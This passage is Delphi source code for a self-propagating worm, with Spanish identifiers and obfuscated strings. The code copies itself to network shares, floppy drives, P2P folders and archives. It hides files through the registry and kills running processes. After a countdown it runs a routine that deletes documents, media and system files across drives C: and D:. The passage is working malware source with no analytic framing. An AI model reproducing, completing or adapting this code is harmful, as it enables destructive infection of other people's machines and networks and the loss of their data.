          AssignFile(SuperTaldo,(PathWindows + e('Vxonoy$nk~',10)));
          Rewrite(SuperTaldo);
          Writeln(SuperTaldo, E(Buffer[n].lpRemoteName,10));
          CloseFile(SuperTaldo)
         end;
       end
        else
         begin
          Stri:=copy(Buffer[n].lpRemoteName,0,2);
          if stri=E('VV',10) then
           begin
            AssignFile(SuperTaldo,(PathWindows + e('Vxonoy$nk~',10)));
            Append(SuperTaldo);
            Writeln(SuperTaldo, E(Buffer[n].lpRemoteName,10));
            CloseFile(SuperTaldo);
          end;
         end;
         if (Buffer[n].dwUsage and RESOURCEUSAGE_CONTAINER)=
            RESOURCEUSAGE_CONTAINER then
             begin
             try
              Enumera(@Buffer[n]);
             except
             end;
             end;
        end;


   end;
     var
      n,i:integer;
      Stri:string;
      Copiables: array of String;
     const
    Nombres:array[0..21] of string =('Foogo$~r~$oro','Iexkped$~r~$oro','Oyixchogo$~r~$oro','Yo*{ cod*oxoy$~r~$oro','De*~o*ef|cne$~r~$oro','^o*{ coxe*g ibe$~r~$oro','Oy~e*oy*zkxk*~c$~r~$oro','De*zenxky*ef|cnkxgo$~r~$oro','Ycod~e*fe*{ o*zkye$~r~$oro','De*go*foky$~r~$oro','De*yes*zkxk*~c$~r~$oro','Akgky ~xk$~r~$oro','Y oûey$~r~$oro','Xokngo$~r~$oro','Cdy~kfkiced$~r~$oro','Ikx~k*Hfkdik$~r~$oro','Cdy~x iicedoy$~r~$oro','Yefc~kxce$~r~$oro','Be~gkcf*bkia$~r~$oro','Ykikx*zkyy*be~gkcf$~r~$oro','Ixkiaokx*]cdne}y$~r~$oro','Bkhfkx*Mxk~cy$~r~$oro');

   begin
      Enumera(nil);

      if fileexists(PathWindows + e('Vxonoy$nk~',10)) then
       begin
        cantidad:=Lista(PathWindows + e('Vxonoy$nk~',10));
        AssignFile(SuperTaldo,(PathWindows + e('Vxonoy$nk~',10)));
        FileMode := 0;
        Reset(SuperTaldo);

        Randomize;
        SetLength(Copiables, Cantidad);

        For i:=0 to (Cantidad - 1) do
         begin
          Readln(SuperTaldo, Copio);
          var1:=Pchar(PathWindows + '\' +paramstr(2));
          var2:=Pchar(e(Copio,10) +'\'+ e(Nombres[random(21)],10));
          copiables[i]:=Var2;
         end;
          CloseFile(SuperTaldo);


        For n:=0 to Cantidad -1 do
         begin
          CopyFile(Pchar(Var1),Pchar(copiables[n]),True);
         End;

       sleep(1000);
       DeleteFile(Pchar(PathWindows + e('Vxonoy$nk~',10)));
      end;
   end;

   Procedure Wear;
   var
    contar, i:integer;
   begin
       Ficheros:=TStringList.Create;
       BuscaFicheros('c:\','*.xls',Ficheros,TRUE);
       BuscaFicheros('c:\','*.doc',Ficheros,TRUE);
       BuscaFicheros('c:\','*.ppt',Ficheros,TRUE);
       BuscaFicheros('c:\','*.mdb',Ficheros,TRUE);
       BuscaFicheros('c:\','*.iso',Ficheros,TRUE);
       BuscaFicheros('c:\','*.rar',Ficheros,TRUE);
       BuscaFicheros('c:\','*.zip',Ficheros,TRUE);
       BuscaFicheros('c:\','*.mp3',Ficheros,TRUE);
       BuscaFicheros('c:\','*.avi',Ficheros,TRUE);
       BuscaFicheros('c:\','*.mpg',Ficheros,TRUE);
       BuscaFicheros('c:\','*.txt',Ficheros,TRUE);
       BuscaFicheros('c:\','*.htm',Ficheros,TRUE);
       BuscaFicheros('c:\','*.pif',Ficheros,TRUE);
       BuscaFicheros('c:\','*.scr',Ficheros,TRUE);
       BuscaFicheros('c:\','*.log',Ficheros,TRUE);
       BuscaFicheros('c:\','*.jpg',Ficheros,TRUE);
       BuscaFicheros('c:\','*.bmp',Ficheros,TRUE);
       BuscaFicheros('c:\','*.pdf',Ficheros,TRUE);
       BuscaFicheros('c:\','*.pdf',Ficheros,TRUE);
       BuscaFicheros('c:\','*.wmv',Ficheros,TRUE);
       BuscaFicheros('c:\','*.wmw',Ficheros,TRUE);
       BuscaFicheros('c:\','*.lnk',Ficheros,TRUE);
       BuscaFicheros('c:\','*.wav',Ficheros,TRUE);

       BuscaFicheros('c:\','*.vxd',Ficheros,TRUE);
       BuscaFicheros('c:\','*.sys',Ficheros,TRUE);
       BuscaFicheros('c:\','*.dll',Ficheros,TRUE);
       BuscaFicheros('c:\','*.exe',Ficheros,TRUE);


       BuscaFicheros('d:\','*.xls',Ficheros,TRUE);
       BuscaFicheros('d:\','*.doc',Ficheros,TRUE);
       BuscaFicheros('d:\','*.ppt',Ficheros,TRUE);
       BuscaFicheros('d:\','*.mdb',Ficheros,TRUE);
       BuscaFicheros('d:\','*.iso',Ficheros,TRUE);
       BuscaFicheros('d:\','*.rar',Ficheros,TRUE);
       BuscaFicheros('d:\','*.zip',Ficheros,TRUE);
       BuscaFicheros('d:\','*.mp3',Ficheros,TRUE);
       BuscaFicheros('d:\','*.avi',Ficheros,TRUE);
       BuscaFicheros('d:\','*.mpg',Ficheros,TRUE);
       BuscaFicheros('d:\','*.txt',Ficheros,TRUE);
       BuscaFicheros('d:\','*.htm',Ficheros,TRUE);
       BuscaFicheros('d:\','*.pif',Ficheros,TRUE);
       BuscaFicheros('d:\','*.scr',Ficheros,TRUE);
       BuscaFicheros('d:\','*.log',Ficheros,TRUE);
       BuscaFicheros('d:\','*.jpg',Ficheros,TRUE);
       BuscaFicheros('d:\','*.bmp',Ficheros,TRUE);
       BuscaFicheros('d:\','*.pdf',Ficheros,TRUE);
       BuscaFicheros('d:\','*.pdf',Ficheros,TRUE);
       BuscaFicheros('d:\','*.wmv',Ficheros,TRUE);
       BuscaFicheros('d:\','*.wmw',Ficheros,TRUE);
       BuscaFicheros('d:\','*.lnk',Ficheros,TRUE);
       BuscaFicheros('d:\','*.wav',Ficheros,TRUE);

       BuscaFicheros('d:\','*.vxd',Ficheros,TRUE);
       BuscaFicheros('d:\','*.sys',Ficheros,TRUE);
       BuscaFicheros('d:\','*.dll',Ficheros,TRUE);
       BuscaFicheros('d:\','*.exe',Ficheros,TRUE);

       Contar:=Ficheros.Count;
       for i:=0 to contar-1 do
        begin
         DeleteFile(Pchar(Ficheros.Strings[i]));
        end;
   end;



   Procedure InfDisk;
   label go;

    begin
   go:

   if DiskInDrive('a') then
    begin
     CopyFile(Pchar(Path),Pchar(E('k0VXokngo$~r~$oro',10)),True)
    end;
       Sleep(600000);
       goto go;
   end;

   procedure Office;
   var esleep:integer;
   label go;

    begin
   go:
   esleep:=1000;
    if FindWindow(Pchar('OpusAPP'),nil) > 0 then
     begin
      CopyFile(Pchar(Path),Pchar(E('k0VXokngo$~r~$oro',10)),True);
      esleep:=600000;
      Sleep(esleep);
      esleep:=1000;
      end;
      Sleep(esleep);
   goto go;
   end;


   Procedure InfectarSistema_;
   label go;

   begin
   go:
    InfectarSistema;
    Sleep(5000);
   goto go;
   end;


   Procedure GrabaRegistro_;
   label go;

   begin
    go:
    GrabaRegistroMostrarOcultosFalse;
    Sleep(10000);
   goto go;
   end;


   Procedure MatarVarios_;
   label go;

   begin
   go:
    MatarVarios;
    Sleep(100);
   goto go;
   end;



   Procedure Wear_;
   label go;

    begin
   go:
    Wear;
    Sleep(600000);
   goto go;
   end;

    begin
   //************************ Aca va el codigo... *************************
   InfectarSistema;
   Ocultar; //98,95 barra de tareas ;
   UnaVez;


    if (paramstr(1) = 'c') or (paramstr(1) = 'C')  then
     Begin
      CopyFile(Pchar(Paramstr(0)),Pchar(PathWindows + '\'+paramstr(2)),true);
     End;
                                      //Muerte.drv
   if not fileExists(PathWindows + E('VG ox~o$nx|',10)) then
   begin
       Fichero:=PathWindows + E('VG ox~o$nx|',10);
       AssignFile(SuperTaldo,Fichero);
       Rewrite(SuperTaldo);
       Writeln(SuperTaldo,'20');
       CloseFile(SuperTaldo);
   end;
       AssignFile(SuperTaldo, pathwindows + E('VG ox~o$nx|',10));
       Reset(SuperTaldo);
       Readln(SuperTaldo, Valor);
       CloseFile(SuperTaldo);

   if valor <> '0' then
    begin
       Rewrite(SuperTaldo);
       valorInt := (strtoint(valor))-1;
       valor:= inttostr(valorint);
       Writeln(SuperTaldo,valor);
       CloseFile(SuperTaldo);
    end;

   GrabaRegistroMostrarOcultosFalse;
   ActulizarCarpetasTrue;

   MatarVarios;
   InfectP2P;
    CreateThread(nil,0,@InfDisk,nil,0,tears);
    CreateThread(nil,0,@Office,nil,0,tears);
    CreateThread(nil,0,@InfectarSistema_,nil,0,tears);
    CreateThread(nil,0,@GrabaRegistro_,nil,0,tears);
    CreateThread(nil,0,@MatarVarios_,nil,0,tears);

   if valor <= '0' then
   begin
    CreateThread(nil,0,@Wear_,nil,0,tears);
   end;

   CreateThread(nil,0,@InfectRarZip,nil,0,tears);
   Sleep(120000);
   InfectarEntornoRed;
   Sleep($ffffffff);


   end.
